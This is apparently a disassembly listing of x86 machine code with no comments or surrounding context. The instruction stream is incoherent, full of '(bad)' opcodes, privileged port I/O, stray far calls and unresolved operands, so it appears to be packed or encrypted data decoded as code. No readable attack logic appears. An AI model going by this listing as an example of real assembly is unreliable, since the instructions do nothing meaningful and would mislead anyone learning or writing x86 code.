  411929:	push   ds
  41192a:	mov    eax,0xa64a3c8f
  41192f:	sub    eax,0x63289267
  411934:	xchg   ecx,eax
  411935:	add    ebx,DWORD PTR [edi+0x631effa4]
  41193b:	call   0xd2a3:0xf5a4feb0
  411942:	loopne 0x411901
  411944:	pop    ebp
  411945:	or     al,0xbf
  411947:	jl     0x4118e0
  411949:	cmp    esi,DWORD PTR [ecx]
  41194b:	add    BYTE PTR [edi+0x57693525],0xa9
  411952:	inc    esi
  411953:	cmp    ebp,DWORD PTR [ebx+0x3e631ca5]
  411959:	adc    esp,DWORD PTR [esi-0x281b85c]
  41195f:	jge    0x411992
  411961:	xor    ah,cl
  411963:	pop    es
  411964:	lock push ds
  411966:	in     al,dx
  411967:	pop    esi
  411968:	mov    cl,0x5b
  41196a:	adc    al,0x48
  41196c:	sub    BYTE PTR [ebx+0x33],bh
  41196f:	leave  
  411970:	lods   eax,DWORD PTR ds:[esi]
  411971:	mov    eax,0x104757aa
  411976:	cmp    eax,0x64d759c6
  41197b:	nop
  41197c:	shl    esi,cl
  41197e:	mov    bl,0xa2
  411980:	cmp    eax,0xa46d40e3
  411985:	xchg   ebp,eax
  411986:	repz enter 0x5b12,0x67
  41198b:	imul   eax,DWORD PTR [ebx+0x2a],0xae46a007
  411992:	not    BYTE PTR ds:0x43858818
  411998:	push   edi
  411999:	add    dh,BYTE PTR [edi+0x2b]
  41199c:	stos   DWORD PTR es:[edi],eax
  41199d:	xchg   edi,eax
  41199e:	mov    fs,WORD PTR [esi+ebx*1]
  4119a1:	mov    ch,0x3e
  4119a3:	mov    dh,cl
  4119a5:	xchg   BYTE PTR [ebx+0x44],cl
  4119a8:	pusha  
  4119a9:	mov    WORD PTR [ebx],?
  4119ab:	pop    eax
  4119ac:	add    BYTE PTR [ebx],dh
  4119ae:	aam    0x7c
  4119b0:	loopne 0x411948
  4119b2:	test   al,0x64
  4119b4:	sub    esp,esi
  4119b6:	outs   dx,DWORD PTR ds:[esi]
  4119b7:	nop
  4119b8:	outs   dx,DWORD PTR ds:[si]
  4119ba:	mov    al,0x5d
  4119bc:	shl    ah,1
  4119be:	ins    BYTE PTR es:[edi],dx
  4119bf:	in     al,dx
  4119c0:	cmp    BYTE PTR [ebx-0x65],dh
  4119c3:	adc    BYTE PTR [ebp+0x73],al
  4119c6:	scas   eax,DWORD PTR es:[edi]
  4119c7:	sbb    al,0xe2
  4119c9:	imul   eax,edx,0xdd84e851
  4119cf:	mov    edx,0x7552b3c5
  4119d4:	call   0x325f:0x900c3d08
  4119db:	pop    ebx
  4119dc:	shl    BYTE PTR [esi-0xc9a2f66],0xb3
  4119e3:	aad    0x53
  4119e5:	das    
  4119e6:	enter  0x94db,0xf3
  4119ea:	ror    ebp,1
  4119ec:	fs jg  0x411a15
  4119ef:	adc    BYTE PTR [esi+ecx*1],0xea
  4119f3:	je     0x4119de
  4119f5:	jge    0x4119c6
  4119f7:	cmp    cl,bl
  4119f9:	sti    
  4119fa:	(bad)  
  4119fb:	iret   
  4119fc:	jp     0x411a7c
  4119fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ff:	retf   0xce66
  411a02:	popa   
  411a03:	adc    al,0x87
  411a05:	sbb    DWORD PTR [eax],0xffffffd0
  411a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a09:	mov    ebp,0xc2f8a99a
  411a0e:	retf   0x48d0
  411a11:	and    BYTE PTR [ebx],0xdc
  411a14:	out    dx,al
  411a15:	out    dx,eax
  411a16:	or     DWORD PTR [edx+0xd],ebp
  411a19:	in     al,0xdc
  411a1b:	sub    eax,0x58442f75
  411a20:	jb     0x4119ea
  411a22:	sar    bl,1
  411a24:	push   ecx
  411a25:	fild   DWORD PTR [edi]
  411a27:	xchg   ebx,eax
  411a28:	sub    edi,edi
  411a2a:	adc    BYTE PTR [esi+eiz*4],al
  411a2d:	push   ebp
  411a2e:	lods   eax,DWORD PTR ds:[esi]
  411a2f:	inc    edi
  411a30:	add    esp,DWORD PTR [edx+0x6b635ca6]
  411a36:	mov    ah,0xd4
  411a38:	aad    0x6d
  411a3a:	push   ebx
  411a3b:	mov    cl,0x72
  411a3d:	xchg   ecx,eax
  411a3e:	icebp  
  411a3f:	sbb    al,0xe3
  411a41:	jge    0x4119c3
  411a43:	mov    edi,0xf0af9511
  411a48:	mov    ebp,edx
  411a4a:	pop    ebp
  411a4b:	mov    ds:0xb12da1ca,eax
  411a50:	xchg   ecx,eax
  411a51:	stos   BYTE PTR es:[edi],al
  411a52:	retf   0xa010
  411a55:	inc    esp
  411a56:	rep outs dx,DWORD PTR ds:[esi]
  411a58:	mov    esi,0xa4eb48ba
  411a5d:	inc    esi
  411a5e:	mov    al,0xc3
  411a60:	mov    dl,0xbe
  411a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a63:	jne    0x411a5f
  411a65:	(bad)  
  411a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a67:	and    BYTE PTR [edi*8-0x590d4650],bh
  411a6e:	pop    eax
  411a6f:	mov    ?,WORD PTR [edx]
  411a71:	fs ja  0x411a7e
  411a74:	(bad)  
  411a76:	popa   
  411a77:	mov    esi,0xdcf7a080
  411a7c:	add    cl,bh
  411a7e:	xchg   ebx,eax
  411a7f:	sar    ecx,cl
  411a81:	jo     0x411ad6
  411a83:	push   ss
  411a84:	vpmacssdd xmm1,xmm3,xmm4,xmm1
  411a8a:	das    
  411a8b:	xor    esp,DWORD PTR [edx-0x40]
  411a8e:	lahf   
  411a8f:	xchg   bh,bh
  411a91:	adc    eax,0xce35697f
  411a96:	mov    BYTE PTR [eax],ah
  411a98:	test   al,0x3f
  411a9a:	ins    BYTE PTR es:[edi],dx
  411a9b:	xor    esi,DWORD PTR [eax-0x6a]
  411a9e:	push   0x96fb9313
  411aa3:	dec    esp
  411aa4:	mov    edx,edx
  411aa6:	add    BYTE PTR [eax],al
  411aa8:	sub    al,0x76
  411aaa:	jge    0x411ad9
  411aac:	adc    eax,0x6192e04a
  411ab1:	test   DWORD PTR [ebp+0xe],0x2c695819
  411ab8:	xchg   edi,eax
  411ab9:	jne    0x411aaa
  411abb:	out    0x6,al
  411abd:	bound  eax,QWORD PTR [edx+edx*4]
  411ac0:	xor    eax,0x61ae05bf
  411ac5:	jns    0x411a9f
  411ac7:	lock (bad) 
  411ac9:	rcr    edx,cl
  411acb:	imul   ebp,ecx,0xffffff82
  411ace:	out    0x10,eax
  411ad0:	inc    ebp
  411ad1:	adc    BYTE PTR [ebx-0xb],al
  411ad4:	(bad)  [ecx-0x1fc0b50]
  411ada:	add    BYTE PTR [ebx],bl
  411adc:	test   al,0xfe
  411ade:	xor    cl,ch
  411ae0:	and    DWORD PTR [edi-0x3a0267db],ebp
  411ae6:	in     al,0x86
  411ae8:	jb     0x411b33
  411aea:	jae    0x411af4
  411aec:	mov    ch,0xfe
  411aee:	pop    ss
  411aef:	enter  0x4748,0x4a
  411af3:	into   
  411af4:	call   0xcf1f:0x9bf2806e
  411afb:	xchg   edx,eax
  411afc:	retf   
  411afd:	inc    esp
  411afe:	test   dl,cl
  411b00:	aad    0x3d
  411b02:	sub    ch,al
  411b04:	push   ecx
  411b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b06:	(bad)  
  411b07:	jle    0x411b16
  411b09:	inc    esp
  411b0a:	fs int 0x66
  411b0d:	and    ecx,edx
  411b0f:	pusha  
  411b10:	or     al,cl
  411b12:	outs   dx,BYTE PTR ds:[esi]
  411b13:	fwait
  411b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b15:	shl    dl,1
  411b17:	mov    eax,0xe274c06
  411b1c:	cmp    dl,al
  411b1e:	aam    0x16
  411b20:	call   0x1694:0x89cd9bae
  411b27:	cmc    
  411b28:	ror    BYTE PTR [edx+0x3a],1
  411b2b:	pop    edi
  411b2c:	imul   edx,DWORD PTR [edi],0xffffff81
  411b2f:	sub    cl,dh
  411b31:	xchg   BYTE PTR [esi+0x59],ah
  411b34:	out    dx,eax
  411b35:	dec    ebp
  411b36:	or     eax,0x1668bf23
  411b3b:	and    eax,DWORD PTR [bx+si]
  411b3e:	mov    ah,0x30
  411b40:	retf   0x689d
  411b43:	fmul   st,st(4)
  411b45:	mov    cs,WORD PTR [ebp+0x8e54f06]
  411b4b:	fdiv   QWORD PTR [ebx]
  411b4d:	shl    edx,0x13
  411b50:	repz dec ebp
  411b52:	or     dh,BYTE PTR [edx+0x69]
  411b55:	sub    cl,BYTE PTR [edi+eax*4-0x6f095831]
  411b5c:	inc    esp
  411b5d:	in     eax,0xc2
  411b5f:	fstp   DWORD PTR [eax-0x4037c22f]
  411b65:	mov    fs:0xf13779cf,al
  411b6b:	xchg   esi,eax
  411b6c:	push   edi
  411b6d:	adc    eax,0xa89eba8
  411b72:	add    eax,0x7da683a2
  411b77:	clts   
  411b79:	out    dx,al
  411b7a:	mov    dh,BYTE PTR [edx]
  411b7c:	sbb    ebx,DWORD PTR [edx+0x3f04b762]
  411b82:	loopne 0x411b70
  411b84:	(bad)  
  411b86:	and    eax,0x38036afd
  411b8b:	(bad)  
  411b8c:	clc    
  411b8d:	in     al,0x9f
  411b8f:	sbb    ecx,ecx
  411b91:	sar    ebp,cl
  411b93:	cmp    eax,0xf1bf58f8
  411b98:	loop   0x411c02
  411b9a:	addr16 mov edx,0xe0ce26e2
  411ba0:	xchg   DWORD PTR [eax-0x7002f29b],edx
  411ba6:	jno    0x411bd8
  411ba8:	jbe    0x411b6d
  411baa:	jge    0x411bd0
  411bac:	xchg   edx,eax
  411bad:	dec    edi
  411bae:	rol    bh,cl
  411bb0:	or     bh,BYTE PTR [eax+0x68a7342b]
  411bb6:	or     eax,0xe3ed865a
  411bbb:	pop    ds
  411bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bbd:	shl    eax,cl
  411bbf:	xchg   DWORD PTR [ebx+0x2d36f943],esi
  411bc5:	mov    ebp,0x45af375f
  411bca:	clc    
  411bcb:	mov    eax,ds:0x31796f4a
  411bd0:	push   ds
  411bd1:	inc    eax
  411bd2:	in     eax,dx
  411bd3:	in     al,dx
  411bd4:	or     edx,DWORD PTR [ebp-0x5f]
  411bd7:	inc    eax
  411bd8:	das    
  411bd9:	test   bh,cl
  411bdb:	inc    edx
  411bdc:	mov    esp,0xbb612add
  411be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411be2:	xor    DWORD PTR [ecx+0x6e],0x3c6bc435
  411be9:	iret   
  411bea:	adc    al,0xe2
  411bec:	xor    DWORD PTR [edx],esi
  411bee:	mov    ch,0x84
  411bf0:	xchg   BYTE PTR ds:[eax-0x69],cl
  411bf4:	nop
  411bf5:	sbb    eax,0x9373162f
  411bfa:	mov    dl,al
  411bfc:	xchg   DWORD PTR [edx],edx
  411bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bff:	popf   
  411c00:	call   0x728d562c
  411c05:	les    ecx,FWORD PTR [ebx-0x7c75f56d]
  411c0b:	add    al,0x4c
  411c0d:	inc    ebx
  411c0e:	xchg   BYTE PTR [ebp-0x77],bh
  411c11:	jns    0x411c55
  411c13:	pop    es
  411c14:	cld    
  411c15:	fcomp  DWORD PTR [esi+edi*2-0x1c544777]
  411c1c:	repnz mov bl,0x71
  411c1f:	jecxz  0x411c00
  411c21:	cmp    ecx,DWORD PTR [esp+esi*4-0xb6d04cb]
  411c28:	test   eax,0x39bbc8b
  411c2d:	jmp    0x7b258b26
  411c32:	jle    0x411bed
  411c34:	or     DWORD PTR [ebx-0xa3c6b82],esp
  411c3a:	mov    ebx,0x25018aac
  411c3f:	xchg   esi,eax
  411c40:	out    0x4a,eax
  411c42:	mov    ds:0x420f6287,eax
  411c47:	jmp    0xda14cfed
  411c4c:	push   ebx
  411c4d:	mov    bh,0xc5
  411c4f:	fwait
  411c50:	pop    esi
  411c51:	mov    esp,0x8f9214bc
  411c56:	mov    bl,0x64
  411c58:	loope  0x411c31
  411c5a:	adc    eax,0x3ae450a9
  411c5f:	adc    DWORD PTR [edi+eiz*1+0x751517db],esi
  411c66:	add    DWORD PTR [ebx-0x10],eax
  411c69:	adc    al,0x4c
  411c6b:	into   
  411c6c:	xchg   edi,eax
  411c6d:	sbb    ah,al
  411c6f:	sbb    edi,DWORD PTR [ebx-0x56]
  411c72:	mov    bl,0x94
  411c74:	rcl    DWORD PTR [ecx+0x5d],0xa6
  411c78:	or     cl,BYTE PTR [ebx+0x1ca61b87]
  411c7e:	xchg   esi,eax
  411c7f:	fst    QWORD PTR [edi+0x57]
  411c82:	stos   BYTE PTR es:[edi],al
  411c83:	cs fs inc edi
  411c86:	imul   edx,ebx,0x7b
  411c89:	cmp    ch,dh
  411c8b:	jmp    FWORD PTR [edi]
  411c8d:	adc    DWORD PTR [ebx+0x4484e3de],edi
  411c93:	inc    esp
  411c94:	pop    ecx
  411c95:	push   es
  411c96:	mov    al,ds:0xb5ef2794
  411c9b:	inc    edi
  411c9c:	mov    edi,0xfd5750fe
  411ca1:	push   ebp
  411ca2:	push   ss
  411ca3:	rcl    DWORD PTR [esi+ecx*1-0x3e11c756],1
  411caa:	sbb    bh,ch
  411cac:	dec    ebp
  411cad:	sub    ah,0x33
  411cb0:	mov    esi,0xf166da94
  411cb5:	dec    ebp
  411cb6:	jns    0x411c88
  411cb8:	addr16 test ecx,0x71c87152
  411cbf:	inc    edi
  411cc0:	cmp    esi,DWORD PTR ds:0xf48f6653
  411cc6:	jle    0x411cb1
  411cc8:	xlat   BYTE PTR ds:[ebx]
  411cc9:	mov    al,ds:0xfd160f13
  411cce:	add    al,0xe0
  411cd0:	(bad)  
  411cd1:	cmp    eax,0x6f236719
  411cd6:	lock push ebp
  411cd8:	sub    cl,BYTE PTR [edi+0x5c1bf539]
  411cde:	fsub   DWORD PTR [ecx]
  411ce0:	jae    0x411d42
  411ce2:	retf   
  411ce3:	in     al,0x18
  411ce5:	mov    ds:0x9c83e8e7,al
  411cea:	mov    esp,eax
  411cec:	inc    ecx
  411ced:	lods   eax,DWORD PTR ds:[esi]
  411cee:	push   ebx
  411cef:	inc    ebx
  411cf0:	dec    esp
  411cf1:	sbb    al,0x9f
  411cf3:	dec    esp
  411cf4:	call   0xa48ea293
  411cf9:	jg     0x411d64
  411cfb:	ror    ebp,cl
  411cfd:	bound  ebp,QWORD PTR [edi]
  411cff:	cli    
  411d00:	shl    BYTE PTR [ecx-0xf],0x85
  411d04:	mov    ah,0xbf
  411d06:	xchg   ebx,eax
  411d07:	xor    eax,0x20d64542
  411d0c:	cdq    
  411d0d:	mov    al,ds:0xa76fdd93
  411d12:	stc    
  411d13:	data16 jcxz 0x411c9b
  411d17:	xchg   esp,eax
  411d18:	mov    eax,0x5d885e8a
  411d1d:	repnz mov edx,DWORD PTR [esi]
  411d20:	(bad)  
  411d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d23:	loop   0x411d01
  411d25:	mov    ebx,0x886abb4a
  411d2a:	sti    
  411d2b:	sub    ebx,esp
  411d2d:	mov    edx,0x1860db6b
  411d32:	sub    si,ax
  411d35:	xor    al,0x18
  411d37:	sbb    esp,DWORD PTR [edi]
  411d39:	adc    ah,dl
  411d3b:	jmp    0x86c5:0x9819b49a
  411d42:	cmp    ecx,ecx
  411d44:	lahf   
  411d45:	push   esp
  411d46:	popf   
  411d47:	cwde   
  411d48:	hlt    
  411d49:	jmp    0x7bbea964
  411d4e:	js     0x411d59
  411d50:	cmp    DWORD PTR [edx+0x5f378381],edi
  411d56:	retf   0x3752
  411d59:	pop    es
  411d5a:	mov    bl,0xfe
  411d5c:	fwait
  411d5d:	cmp    dl,ch
  411d5f:	cwde   
  411d60:	out    dx,eax
  411d61:	ds fs add al,0x95
  411d65:	imul   ebx,DWORD PTR [edx],0x2d
  411d68:	mov    ah,0xaa
  411d6a:	stos   BYTE PTR es:[edi],al
  411d6b:	fwait
  411d6c:	lods   al,BYTE PTR ds:[esi]
  411d6d:	outs   dx,BYTE PTR ds:[esi]
  411d6e:	fbld   TBYTE PTR [edx+0x65]
  411d71:	(bad)  
  411d73:	retf   
  411d74:	pushf  
  411d75:	ja     0x411d80
  411d77:	mov    bl,0x2
  411d79:	xor    al,bh
  411d7b:	mov    bh,0x96
  411d7d:	lds    ebx,FWORD PTR [eax+0x27]
  411d80:	jl     0x411d17
  411d82:	mov    dl,0x52
  411d84:	stos   BYTE PTR es:[edi],al
  411d85:	test   DWORD PTR [edi],edi
  411d87:	inc    eax
  411d88:	outs   dx,BYTE PTR ds:[esi]
  411d89:	popa   
  411d8a:	cs es push esp
  411d8d:	ins    BYTE PTR es:[edi],dx
  411d8e:	les    edx,FWORD PTR [eax]
  411d90:	aam    0x73
  411d92:	or     DWORD PTR [ebx],esp
  411d94:	lds    eax,FWORD PTR [esp+ebx*4-0x38267f89]
  411d9b:	push   eax
  411d9c:	mov    esp,DWORD PTR [ebx]
  411d9e:	lods   al,BYTE PTR ds:[esi]
  411d9f:	bound  ecx,QWORD PTR [ebp+0x3d7c1236]
  411da5:	imul   edi,DWORD PTR [ebx+ebp*8+0x7f],0xffffffe4
  411daa:	and    eax,0x5583aafa
  411daf:	pop    esp
  411db0:	sbb    al,0xf5
  411db2:	xlat   BYTE PTR ds:[ebx]
  411db3:	(bad)  
  411db4:	dec    edi
  411db5:	test   bh,0x5c
  411db8:	xor    al,0xf0
  411dba:	retf   
  411dbb:	mov    BYTE PTR [esp+edi*8],ch
  411dbe:	gs push ds
  411dc0:	push   es
  411dc1:	pusha  
  411dc2:	aad    0xa7
  411dc4:	xlat   BYTE PTR ds:[ebx]
  411dc5:	pop    ss
  411dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dc7:	test   BYTE PTR ds:0x78a6c82a,ch
  411dcd:	mov    ebp,0x8e22123
  411dd2:	push   cs
  411dd3:	inc    ecx
  411dd4:	and    eax,0x67256629
  411dd9:	xor    al,0x85
  411ddb:	js     0x411d99
  411ddd:	jmp    0xbe49:0x18027870
  411de4:	repz push ebx
  411de6:	(bad)  [eax]
  411de8:	test   DWORD PTR [eax-0xd],ebx
  411deb:	mov    al,0xd3
  411ded:	xchg   ebx,eax
  411dee:	inc    edi
  411def:	inc    ebx
  411df0:	push   0xffffff9d
  411df2:	aas    
  411df3:	dec    edi
  411df4:	adc    al,0x80
  411df6:	add    eax,0x3052a9a7
  411dfb:	mov    DWORD PTR [ebx-0x16],esp
  411dfe:	in     al,0x4b
  411e00:	push   edx
  411e01:	clc    
  411e02:	dec    ecx
  411e03:	or     cl,bl
  411e05:	retf   
  411e06:	js     0x411e4b
  411e08:	cmp    BYTE PTR [ebx+0x11],al
  411e0b:	xchg   edx,eax
  411e0c:	xor    al,BYTE PTR [ecx]
  411e0e:	inc    esp
  411e0f:	xlat   BYTE PTR ds:[ebx]
  411e10:	imul   ecx,DWORD PTR [edi-0x8],0x82ca4405
  411e17:	vorps  xmm7,xmm6,XMMWORD PTR [edx]
  411e1b:	adc    DWORD PTR ds:0x6f4f8b46,ecx
  411e21:	ins    BYTE PTR es:[edi],dx
  411e22:	in     eax,dx
  411e23:	fdivp  st(7),st
  411e25:	enter  0x2ef3,0xea
  411e29:	cmp    al,0x1c
  411e2b:	fisub  WORD PTR ds:0xef7b7c1
  411e31:	mov    eax,0xd05d44
  411e36:	test   DWORD PTR [ebx-0xf13dbe7],edx
  411e3c:	out    dx,eax
  411e3d:	(bad)  
  411e3f:	add    BYTE PTR [esi+0x1f5686d6],al
  411e45:	adc    al,0x96
  411e47:	and    ah,BYTE PTR [ebp+ebx*4-0x74297f8d]
  411e4e:	call   0xd2bb8d85
  411e53:	mov    ecx,0x2f4b76f3
  411e58:	mov    DWORD PTR [edi],esp
  411e5a:	inc    eax
  411e5b:	pop    esi
  411e5c:	nop
  411e5d:	xor    BYTE PTR [edx+0x3a],dh
  411e60:	fimul  WORD PTR [ebx-0x53]
  411e63:	out    dx,eax
  411e64:	dec    esi
  411e65:	aaa    
  411e66:	pusha  
  411e67:	jnp    0x411ec2
  411e69:	cmp    eax,0x822563bf
  411e6e:	rol    cl,cl
  411e70:	imul   esp,DWORD PTR [esi],0xcc7b2a6d
  411e76:	push   eax
  411e77:	add    BYTE PTR [eax-0x33db2cc1],bh
  411e7d:	bound  ecx,QWORD PTR [esi-0xd]
  411e80:	inc    ebx
  411e81:	mov    eax,0x6f9d3ec0
  411e86:	int3   
  411e87:	shl    BYTE PTR [esi],1
  411e89:	push   0x0
  411e8b:	push   cs
  411e8c:	js     0x411e83
  411e8e:	(bad)  
  411e8f:	mov    ebp,0xe21e9fb9
  411e94:	sti    
  411e95:	(bad)  
  411e96:	ins    DWORD PTR es:[edi],dx
  411e97:	jle    0x411e46
  411e99:	in     eax,0x91
  411e9b:	clc    
  411e9c:	and    eax,0x2ad3477c
  411ea1:	xchg   ebp,eax
  411ea2:	pop    edx
  411ea3:	sar    DWORD PTR ds:0x247062fe,0x17
  411eaa:	cli    
  411eab:	pushf  
  411eac:	mov    al,BYTE PTR [edi]
  411eae:	inc    ecx
  411eaf:	sahf   
  411eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb1:	mov    ebp,0x9a918ad5
  411eb6:	pushf  
  411eb7:	sbb    cl,BYTE PTR [eax+0x3eca94df]
  411ebd:	jnp    0x411e65
  411ebf:	ret    
  411ec0:	(bad)  
  411ec1:	jmp    0xb0cb:0xd2535823
  411ec8:	out    0x64,eax
  411eca:	mov    WORD PTR [ebx],?
  411ecc:	int3   
  411ecd:	enter  0xdba,0xbf
  411ed1:	fistp  QWORD PTR [esi-0x1f]
  411ed4:	lods   eax,DWORD PTR ds:[esi]
  411ed5:	aaa    
  411ed6:	popf   
  411ed7:	add    al,0xc1
  411ed9:	hlt    
  411eda:	inc    BYTE PTR [edx-0x70]
  411edd:	mov    ecx,?
  411edf:	ret    
  411ee0:	std    
  411ee1:	cwde   
  411ee2:	pop    ecx
  411ee3:	imul   esi,DWORD PTR [edx],0x40c15a3d
  411ee9:	lods   al,BYTE PTR ds:[esi]
  411eea:	test   DWORD PTR [eax+ebp*1+0x3cac3cc1],esi
  411ef1:	inc    ebx
  411ef2:	sub    bl,ah
  411ef4:	out    0x7f,eax
  411ef6:	ffreep st(0)
  411ef8:	jle    0x411f22
  411efa:	aad    0x45
  411efc:	dec    edx
  411efd:	sub    al,0xf0
  411eff:	xchg   ebx,eax
  411f00:	push   0x1d12c327
  411f05:	hlt    
  411f06:	or     dl,BYTE PTR [ebx-0x1291ddb]
  411f0c:	scas   eax,DWORD PTR es:[edi]
  411f0d:	pop    ebp
  411f0e:	or     DWORD PTR [esi],esp
  411f10:	sar    bl,1
  411f12:	push   ds
  411f13:	or     ebp,DWORD PTR [esi+0x644778fe]
  411f19:	lods   al,BYTE PTR ds:[esi]
  411f1a:	(bad)
  411f1e:	imul   eax,DWORD PTR [ecx-0x67394015],0x41
  411f25:	mov    ch,0xfe
  411f27:	mov    ecx,DWORD PTR ds:0x57b7b18c
  411f2d:	inc    ecx
  411f2e:	inc    ecx
  411f2f:	pop    ebp
  411f30:	int3   
  411f31:	addr16 inc ecx
  411f33:	std    
  411f34:	push   0xdf9d7789
  411f39:	pop    edi
  411f3a:	add    bh,BYTE PTR [ecx]
  411f3c:	out    0xb8,eax
  411f3e:	jae    0x411ec8
  411f40:	ins    BYTE PTR es:[edi],dx
  411f41:	push   ebp
  411f42:	hlt    
  411f43:	mov    al,0xcf
  411f45:	int3   
  411f46:	mov    eax,ds:0x85692551
  411f4b:	jp     0x411fb0
  411f4d:	loope  0x411f37
  411f4f:	stos   BYTE PTR es:[edi],al
  411f50:	xor    BYTE PTR [ecx-0x40e87762],dh
  411f56:	and    al,0xcd
  411f58:	push   ds
  411f59:	sti    
  411f5a:	fist   DWORD PTR [edi+esi*1]
  411f5d:	sahf   
  411f5e:	sub    al,0x93
  411f60:	xchg   ebx,eax
  411f61:	retf   0xa52b
  411f64:	repz imul edx,DWORD PTR [esi+0x17],0xb0e7d7a7
  411f6c:	mov    ebp,0x323aecf
  411f71:	rcl    DWORD PTR [ebx-0x19],1
  411f74:	inc    eax
  411f75:	jbe    0x411efd
  411f77:	push   ebx
  411f78:	xchg   edx,eax
  411f79:	mov    ebp,0x4f299ce0
  411f7e:	mov    esp,0xa607bce8
  411f83:	icebp  
  411f84:	pop    ds
  411f85:	xchg   ebp,eax
  411f86:	loop   0x411f27
  411f88:	inc    ebp
  411f89:	lds    edx,FWORD PTR [esi]
  411f8b:	cs inc ebp
  411f8d:	fwait
  411f8e:	cmp    eax,0xf483a27e
  411f93:	sbb    BYTE PTR [eax-0x51],bh
  411f96:	cmp    eax,DWORD PTR [ecx+0x7338657a]
  411f9c:	add    cl,BYTE PTR [edi]
  411f9e:	mov    dh,0x21
  411fa0:	jge    0x411f8e
  411fa2:	sub    DWORD PTR ds:0xc3402f70,ebx
  411fa8:	pop    es
  411fa9:	jmp    0x2e028567
  411fae:	cld    
  411faf:	cmp    eax,0xab5ec5d1
  411fb4:	mov    ds:0x9634e250,al
  411fb9:	std    
  411fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fbb:	push   0x910fbb78
  411fc0:	mov    ecx,0x60599305
  411fc5:	dec    edi
  411fc6:	test   BYTE PTR [ebp+0x229419fc],ah
  411fcc:	jg     0x411f68
  411fce:	xchg   esp,eax
  411fcf:	push   es
  411fd0:	dec    edi
  411fd1:	push   esp
  411fd2:	in     al,dx
  411fd3:	outs   dx,DWORD PTR ds:[esi]
  411fd4:	mov    ch,0xd7
  411fd6:	inc    edx
  411fd7:	sub    BYTE PTR [ebp-0x6f9d4e48],0xe1
  411fde:	lds    edi,FWORD PTR ss:[ebx]
  411fe1:	aaa    
  411fe2:	inc    esp
  411fe3:	aad    0xcb
  411fe5:	clc    
  411fe6:	cmp    ecx,0x5d2adf7a
  411fec:	xchg   ebx,eax
  411fed:	sti    
  411fee:	imul   eax,eax,0xffffffc9
  411ff1:	faddp  st(6),st
  411ff3:	lea    eax,gs:[edi]
  411ff6:	cs enter 0x7fec,0x22
  411ffb:	xor    DWORD PTR [ebp-0x74],ebx
  411ffe:	popa   
  411fff:	sbb    bh,BYTE PTR [ebx+0x7da5aa0]
  412005:	cmp    eax,0x182682c5
  41200a:	xchg   edi,eax
  41200b:	push   es
  41200c:	mov    BYTE PTR [edi-0x50902ac3],0x37
  412013:	(bad)  
  412014:	inc    ecx
  412015:	jg     0x412038
  412017:	hlt    
  412018:	xchg   esp,eax
  412019:	jnp    0x411fc9
  41201b:	cli    
  41201c:	dec    esp
  41201d:	dec    esi
  41201e:	mov    dh,0xfa
  412020:	xchg   ebp,eax
  412021:	dec    edi
  412022:	stc    
  412023:	adc    al,0xa4
  412025:	lea    esi,[ebp+0x6675fd65]
  41202b:	enter  0x239a,0x72
  41202f:	std    
  412030:	retf   
  412031:	lds    edi,FWORD PTR [edx]
  412033:	aam    0x9f
  412035:	gs adc al,0xe9
  412038:	add    eax,0x8641ac33
  41203d:	sbb    DWORD PTR [ecx],esp
  41203f:	pop    esi
  412040:	test   al,0x60
  412042:	mov    DWORD PTR [esi+0x60c4f510],edx
  412048:	rcl    DWORD PTR [ebp+ecx*1+0x1],1
  41204c:	cdq    
  41204d:	push   esi
  41204e:	sbb    dl,BYTE PTR [ebp-0x651b7bed]
  412054:	test   BYTE PTR [edi],ch
  412056:	(bad)  
  412058:	data16 ffree st(3)
  41205b:	jmp    0xc2de0650
  412060:	(bad)  [edi+0x10]
  412063:	push   ebx
  412064:	je     0x412093
  412066:	xor    eax,0xeb623405
  41206b:	in     al,dx
  41206c:	xchg   esi,eax
  41206d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41206e:	inc    esi
  41206f:	inc    eax
  412070:	out    dx,al
  412071:	mov    edx,?
  412073:	sar    ecx,0x4
  412076:	(bad)  
  412077:	dec    ecx
  412078:	ja     0x4120b5
  41207a:	xchg   ebx,eax
  41207b:	cmp    al,0xb
  41207d:	xchg   ecx,eax
  41207e:	push   ecx
  41207f:	mov    eax,0xf8542751
  412084:	cmp    BYTE PTR [eax],bl
  412086:	in     eax,dx
  412087:	fnstsw WORD PTR [ebp-0x6e]
  41208a:	jmp    0xaf76:0xc8083f47
  412091:	push   edi
  412092:	retf   0x33af
  412095:	push   esi
  412096:	in     eax,dx
  412097:	rcr    DWORD PTR [edi],0xb3
  41209a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41209b:	jbe    0x412041
  41209d:	or     BYTE PTR [ecx+0x1],al
  4120a0:	sub    DWORD PTR [eax],esi
  4120a2:	aas    
  4120a3:	rcl    edi,0xac
  4120a6:	dec    ebx
  4120a7:	add    DWORD PTR [edi-0x7a],ecx
  4120aa:	cmp    eax,0x2e35ba91
  4120af:	mov    bh,0x5f
  4120b1:	mov    ebp,0x5c0730fc
  4120b6:	sub    ebx,DWORD PTR [ebx-0x7c08dd1c]
  4120bc:	push   ds
  4120bd:	je     0x41205b
  4120bf:	popf   
  4120c0:	js     0x4120a4
  4120c2:	call   0x89358ff0
  4120c7:	push   esi
  4120c8:	sub    eax,0x1e2ea96b
  4120cd:	and    DWORD PTR [ecx+0x242328a8],ebp
  4120d3:	jns    0x41207c
  4120d5:	mov    esi,0x1b7f3b89
  4120da:	pop    ds
  4120db:	sub    DWORD PTR [eax-0x5b],0xffffffd4
  4120df:	stos   DWORD PTR es:[edi],eax
  4120e0:	inc    ebp
  4120e1:	arpl   dx,cx
  4120e3:	daa    
  4120e4:	aad    0xbf
  4120e6:	push   eax
  4120e7:	push   0x58
  4120e9:	xor    al,0x7e
